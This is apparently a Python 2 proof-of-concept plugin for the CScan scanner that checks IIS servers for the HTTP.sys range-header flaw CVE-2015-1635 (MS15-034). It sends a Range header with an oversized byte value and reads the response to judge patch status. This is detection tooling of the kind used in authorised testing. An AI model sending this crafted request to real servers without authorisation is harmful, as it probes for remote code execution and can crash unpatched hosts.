# coding: utf-8
import socket
import urlparse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'IIS_0101' # 平台漏洞编号，留空
    name = 'IIS v>7.0 HTTP.sys 远程代码执行' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2015-04-15'  # 漏洞公布时间
    desc = '''
    影响范围:
    Windows7
    Windows8
    Windows server 2008
    Windows server 2012
    IIS HTTP.sys 远程代码执行漏洞(CVE-2015-1635)
    远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求
    时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。

    若要利用此漏洞，攻击者必须将经特殊设计的 HTTP 请求发送到受影响的系统。 通过修改 Windows HTTP 堆栈处理
    请求的方式，安装更新可以修复此漏洞。
    ''' # 漏洞描述
    ref = 'https://technet.microsoft.com/zh-CN/library/security/ms15-034.aspx' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'IIS'  # 漏洞应用名称
    product_version = '>7.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a7fb8882-0ae6-4680-a97e-61a4b032a323' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            target = self.target
            port = urlparse.urlparse(target).port
            port = port if port else 80
            # port = int(target.split(':')[2].split('/')[0]) if len(target.split(':'))>2 else 80
            timeout = 200
            if urlparse.urlparse(target).netloc == '':
                target = urlparse.urlparse(target).path
            else:
                target = socket.gethostbyname(urlparse.urlparse(target).netloc)
                
            headers = {
                'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
            }
            
            if port == 443:
                url = 'https://%s:%d' % (target, port)
            else:
                url = 'http://%s:%d' % (target, port)
            r = requests.get(url, verify=False, headers=headers, timeout=timeout)
            if not r.headers.get('server') or "Microsoft" not in r.headers.get('server'):
                # self.output.info('[-] Not IIS')
                return
    
            hexAllFfff = '18446744073709551615'
            headers.update({
                'Host': 'stuff',
                'Range': 'bytes=0-' + hexAllFfff,
            })
            r = requests.get(url, verify=False, headers=headers, timeout=timeout)
            if "Requested Range Not Satisfiable" in r.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
            elif "The request has an invalid header name" in r.content:
                self.output.info('[-] Looks Patched')
            else:
                self.output.info('[-] Unexpected response, cannot discern patch status')
            
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()